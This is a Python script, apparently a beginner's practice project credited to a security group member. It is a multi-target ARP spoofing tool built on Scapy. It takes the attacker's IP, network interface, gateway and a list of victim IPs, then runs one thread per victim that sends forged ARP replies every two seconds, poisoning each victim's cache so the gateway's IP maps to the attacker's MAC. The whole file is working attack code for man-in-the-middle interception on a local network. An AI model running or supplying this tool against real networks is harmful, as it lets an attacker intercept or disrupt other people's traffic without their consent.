#初学Python，主要为了动手敲一些东西，练习一下写代码的能力，顺便实现一下功能
from scapy.all import *
import threading
import re
import time
print("+===========================================================================")
print("+*****Python Arpspoof For Multiple Targets*****")
print("+===========================================================================")
print("+**This is a arpspoof tool made by AdianGg(adian@wgpsec.org)")
print("+**If you are nameless, you can use your heart")
print("+**Thank you for using")
print("+**My Blog:http://www.e-wolf.top")
print("+**Wgpsec:http://www.wgpsec.org")
print("+===========================================================================")
print('\n'*5)
def Usage():
	print("Don't Input Null,Please Input Again")
def UsageIp():
	print('It Is Not IP')
def IsIp(Ip):
	if re.match(r'^((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}',Ip):
		ipis = True
	else:
		ipis = False
	return ipis
def Tlist():
	for i in TargetList:
		print (i)
def Target(TIp):
	TargetMac = getmacbyip(TIp) #目标Mac
	SpoofPack = Ether(dst = TargetMac,src = LhostMac) / ARP(op = 1,hwsrc = LhostMac,psrc = GatewayIp,hwdst = TargetMac,pdst = TIp)
	while True:
		sendp(SpoofPack,inter = 2,iface = NetworkCard)
def option():
	global HostIp
	HostIp = input("Please Input Your Ip:---->>")
	if IsIp(HostIp) ==	True:
		global NetworkCard
		NetworkCard = input("Please Input The NetworkCard:---->>")
		global GatewayIp
		GatewayIp = input("Please Input The GatewayIp:---->>")
		if IsIp(GatewayIp) == True:
			global LhostMac
			LhostMac = getmacbyip(HostIp)#本机Mac
			global GatewayMac
			GatewayMac = getmacbyip(GatewayIp)
		else:
			UsageIp()
	else:
		UsageIp()
		option()

if __name__ == '__main__':
	option()
	TargetList = []
	while True:
		TargetIp = input("Please Input The TargetIp(Input over to Continue):---->>")
		if TargetIp == "":
			Usage()
		elif TargetIp == "over":
			break
		elif IsIp(TargetIp) == True:
			TargetList.append(TargetIp)
			print("\nTargetIpList:")
			Tlist()
		else:
			UsageIp()
	Tnum = len(TargetList)
	for i in range(Tnum):
		ipnum = TargetList[i]
		t = threading.Thread(target = Target,args = (ipnum,))
		t.start()
		time.sleep(1)



		



